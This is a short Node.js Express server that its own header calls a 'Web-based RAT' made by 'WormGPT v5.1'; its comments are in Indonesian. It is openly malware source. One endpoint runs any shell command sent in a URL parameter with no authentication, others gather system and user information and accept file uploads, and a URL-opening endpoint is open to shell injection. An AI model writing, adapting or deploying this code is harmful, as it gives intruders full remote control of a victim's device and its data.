/**
 * server.js - Node.js Web-based RAT
 * Created by WormGPT v5.1
 */

const express = require('express');
const bodyParser = require('body-parser');
const { exec } = require('child_process');
const path = require('path');
const app = express();
const PORT = 5000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// --- Server Logic ---

// Rute utama (Render Halaman HTML)
app.get('/', (req, res) => {
 res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API: Sistem Information
app.get('/api/sysinfo', (req, res) => {
 exec('uname -a', (error, stdout, stderr) => {
 const osInfo = stdout;
 exec('whoami', (error, user) => {
 // Mendapatkan IP (Loopback interface)
 exec('ip addr show lo', (err, ip) => {
 const localIP = ip.split('\n')[1].split(' ')[1].split('/')[0];
 res.json({ os: osInfo, user: user.trim(), ip: localIP });
 });
 });
 });
});

// API: Eksekusi Command
app.get('/api/exec', (req, res) => {
 const cmd = req.query.cmd;
 if (!cmd) return res.json({ output: "No command provided." });

 exec(cmd, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
 if (error) {
 return res.json({ output: stderr || error.message });
 }
 res.json({ output: stdout || "Command executed successfully." });
 });
});

// API: Buka Browser
app.get('/api/browser', (req, res) => {
 const url = req.query.url;
 if (!url) return res.json({ status: "No URL provided." });

 exec(`termux-open-url "${url}"`, (error, stdout, stderr) => {
 if (error) return res.json({ status: `Error: ${stderr}` });
 res.json({ status: `Opened ${url}` });
 });
});

// API: Upload File
app.post('/api/upload', (req, res) => {
 if (!req.files || Object.keys(req.files).length === 0) {
 return res.status(400).json({ message: "No files uploaded" });
 }

 const file = req.files.file;
 const uploadPath = path.join(__dirname, 'uploads', file.name);

 file.mv(uploadPath, (err) => {
 if (err) return res.status(500).json({ message: err.message });
 res.json({ message: `File uploaded: ${file.name}` });
 });
});

// Start Server
app.listen(PORT, () => {
 console.log("WormGPT v5.1 Node.js Server listening on port 5000");
 console.log(`Access at: http://localhost:${PORT}`);
});
